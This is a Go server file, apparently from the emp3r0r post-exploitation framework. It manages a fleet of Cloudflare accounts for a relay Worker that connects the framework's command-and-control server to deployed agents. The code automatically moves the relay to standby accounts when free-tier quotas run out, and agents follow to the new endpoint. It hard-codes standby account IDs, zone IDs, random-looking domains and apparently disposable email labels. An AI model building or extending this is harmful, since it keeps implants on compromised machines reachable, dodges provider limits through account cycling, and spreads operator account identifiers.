package server

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// Cloudflare account fleet for the relay Worker.
//
// The relay Worker is deployed on one CF account at a time ("active"). Free
// plans give 100k DO requests/month; when the active account burns past a
// configured threshold (default 90%) the CC hot-migrates the fleet to the
// next standby account:
//
//	1. deploy the same Worker on the standby account (embedded source,
//	   uploaded via the Scripts API)
//	2. repoint the old account's Worker at the new one (MIGRATE_URL binding:
//	   existing sockets get close(4000, newURL), new connections get 409)
//	3. switch the CC's relay listeners to the new domain
//	4. agents follow the close(4000) frame and re-dial the new endpoint
//
// Accounts and settings live in <workspace>/cf_accounts.json (chmod 600,
// never committed). The legacy single-account cf_relay.json is imported on
// first use and becomes the initial active account.

// CFAccount is one Cloudflare account able to host the relay Worker.
type CFAccount struct {
	// CF account id (32 hex)
	ID string `json:"id"`
	// API token with Workers Scripts + Zone permissions
	APIToken string `json:"api_token"`
	// human label shown in the panel (e.g. the account email)
	Label string `json:"label"`
	// optional custom domain (zone must be on this account)
	Domain string `json:"domain,omitempty"`
	ZoneID string `json:"zone_id,omitempty"`
}

// CFMigrationHistoryEntry records one hot migration.
type CFMigrationHistoryEntry struct {
	Time   time.Time `json:"time"`
	FromID string    `json:"from_account"`
	ToID   string    `json:"to_account"`
	FromHost string  `json:"from_host"`
	ToHost   string   `json:"to_host"`
	Reason  string    `json:"reason"`
	Error   string    `json:"error,omitempty"`
}

// cfAccountsConfig is the on-disk fleet file.
type cfAccountsConfig struct {
	Accounts []*CFAccount `json:"accounts"`
	// which account currently hosts the relay Worker
	ActiveAccountID string `json:"active_account_id"`
	// relay worker script name on every account
	WorkerName string `json:"worker_name"`
	// shared secret baked into every deployment (EMP_SHARED_SECRET)
	SharedSecret string `json:"shared_secret"`
	// migration trigger: DO requests percent of monthly limit
	MigrateThreshold int `json:"migrate_threshold"`
	// enable the automatic watcher
	AutoMigrate bool `json:"auto_migrate"`
	// recent migrations, newest last
	MigrationHistory []*CFMigrationHistoryEntry `json:"migration_history"`
}

const (
	cfDefaultMigrateThreshold = 90
	cfDefaultWorkerName       = "emp3r0r-cf-relay"
	cfDefaultRoomA            = "prod-room-a"
	cfDefaultRoomB            = "prod-room-b"
)

var (
	cfAccountsMu     sync.RWMutex
	cfAccountsLoaded *cfAccountsConfig
)

func cfAccountsPath() string {
	return filepath.Join(live.EmpWorkSpace, "cf_accounts.json")
}

// loadCFAccounts returns the fleet config, initializing the file on first
// use (importing legacy cf_relay.json and seeding the operator's standby
// accounts).
func loadCFAccounts() (*cfAccountsConfig, error) {
	cfAccountsMu.Lock()
	defer cfAccountsMu.Unlock()
	return loadCFAccountsLocked()
}

func loadCFAccountsLocked() (*cfAccountsConfig, error) {
	if cfAccountsLoaded != nil {
		return cfAccountsLoaded, nil
	}
	path := cfAccountsPath()
	data, err := os.ReadFile(path)
	if err != nil {
		// first run: seed the file
		cfg := seedCFAccounts()
		if err := saveCFAccountsLocked(cfg); err != nil {
			return nil, err
		}
		logging.Infof("CF accounts: initialized %s (%d accounts, active %s)",
			path, len(cfg.Accounts), cfg.ActiveAccountID)
		cfAccountsLoaded = cfg
		return cfg, nil
	}
	var cfg cfAccountsConfig
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("parse %s: %w", path, err)
	}
	if cfg.WorkerName == "" {
		cfg.WorkerName = cfDefaultWorkerName
	}
	if cfg.MigrateThreshold <= 0 || cfg.MigrateThreshold > 100 {
		cfg.MigrateThreshold = cfDefaultMigrateThreshold
	}
	cfAccountsLoaded = &cfg
	return &cfg, nil
}

// seedCFAccounts builds the initial fleet: the legacy relay account becomes
// active, operator-provided standbys are appended. Returns the config even
// when the legacy file is absent (empty fleet, panel-only mode).
func seedCFAccounts() *cfAccountsConfig {
	cfg := &cfAccountsConfig{
		WorkerName:       cfDefaultWorkerName,
		MigrateThreshold: cfDefaultMigrateThreshold,
		AutoMigrate:      true,
	}

	// import legacy single-account credentials if present
	if legacy, err := loadCFRelayConfig(); err == nil && legacy.APIToken != "" {
		active := &CFAccount{
			ID:       legacy.AccountID,
			APIToken: legacy.APIToken,
			Label:    "relay (imported)",
		}
		cfg.Accounts = append(cfg.Accounts, active)
		cfg.ActiveAccountID = legacy.AccountID
	}

	// shared secret: reuse the one in the current relay URLs so the migrated
	// deployment accepts the exact same agents/CC (import time).
	if cfg.SharedSecret == "" {
		cfg.SharedSecret = relaySecretOf(live.RuntimeConfig.RelayURLs)
	}

	// operator standbys. API tokens are intentionally NOT embedded here
	// (they'd trip secret scanning and belong in the panel-managed file);
	// the operator pastes them in the Worker management page, which persists
	// them to cf_accounts.json (chmod 600, never committed).
	standbys := []*CFAccount{
		{
			ID:     "de125516090c187013ee876402af142e",
			Label:  "jocelyne5990be@vnl.moonvf.com",
			Domain: "j6k5as4z6k.kdns.fr",
			ZoneID: "ae8f7449dc4347e3e84172c53c59dd86",
		},
		{
			ID:     "6f821d9007af634b88363fd73e993cb5",
			Label:  "coh5aff19@j7.foodlpqse.com",
			Domain: "zhpmt8ymbc.kdns.fr",
			ZoneID: "0c7fcadbcde2963042e6aacad0619c1c",
		},
	}
	for _, s := range standbys {
		if cfg.findByID(s.ID) == nil {
			cfg.Accounts = append(cfg.Accounts, s)
		}
	}
	return cfg
}

func (c *cfAccountsConfig) findByID(id string) *CFAccount {
	for _, a := range c.Accounts {
		if a.ID == id {
			return a
		}
	}
	return nil
}

func saveCFAccounts() error {
	cfAccountsMu.Lock()
	defer cfAccountsMu.Unlock()
	if cfAccountsLoaded == nil {
		return fmt.Errorf("cf accounts not loaded")
	}
	return saveCFAccountsLocked(cfAccountsLoaded)
}

func saveCFAccountsLocked(cfg *cfAccountsConfig) error {
	path := cfAccountsPath()
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return err
	}
	if err := os.WriteFile(path, data, 0600); err != nil {
		return err
	}
	cfAccountsLoaded = cfg
	return nil
}

// mutateCFAccounts applies fn under the lock and persists the result.
func mutateCFAccounts(fn func(cfg *cfAccountsConfig) error) error {
	cfAccountsMu.Lock()
	defer cfAccountsMu.Unlock()
	cfg, err := loadCFAccountsLocked()
	if err != nil {
		return err
	}
	if err := fn(cfg); err != nil {
		return err
	}
	return saveCFAccountsLocked(cfg)
}

// cfActiveAccount returns the account currently hosting the relay Worker.
func cfActiveAccount() (*CFAccount, error) {
	cfAccountsMu.RLock()
	defer cfAccountsMu.RUnlock()
	cfg, err := loadCFAccountsLocked()
	if err != nil {
		return nil, err
	}
	if cfg.ActiveAccountID == "" {
		return nil, fmt.Errorf("no active CF account configured")
	}
	a := cfg.findByID(cfg.ActiveAccountID)
	if a == nil {
		return nil, fmt.Errorf("active CF account %s not in fleet", cfg.ActiveAccountID)
	}
	return a, nil
}

// nextStandbyAccount picks the standby account after the active one in
// fleet order (round-robin across the month boundary).
func nextStandbyAccount(cfg *cfAccountsConfig) *CFAccount {
	if len(cfg.Accounts) == 0 {
		return nil
	}
	idx := -1
	for i, a := range cfg.Accounts {
		if a.ID == cfg.ActiveAccountID {
			idx = i
			break
		}
	}
	// active account not found (fresh fleet): take the first usable entry
	if idx == -1 {
		for _, a := range cfg.Accounts {
			if a.APIToken != "" {
				return a
			}
		}
		return nil
	}
	for step := 1; step <= len(cfg.Accounts); step++ {
		cand := cfg.Accounts[(idx+step)%len(cfg.Accounts)]
		if cand.ID != cfg.ActiveAccountID && cand.APIToken != "" {
			return cand
		}
	}
	return nil
}

// sortedHistory returns migration history newest-first (for the panel).
func (c *cfAccountsConfig) sortedHistory() []*CFMigrationHistoryEntry {
	out := make([]*CFMigrationHistoryEntry, len(c.MigrationHistory))
	copy(out, c.MigrationHistory)
	sort.Slice(out, func(i, j int) bool {
		return out[i].Time.After(out[j].Time)
	})
	return out
}

// maskToken keeps the first 8 and last 4 chars for panel display.
func maskToken(tok string) string {
	if len(tok) <= 14 {
		return "****"
	}
	return tok[:8] + "..." + tok[len(tok)-4:]
}
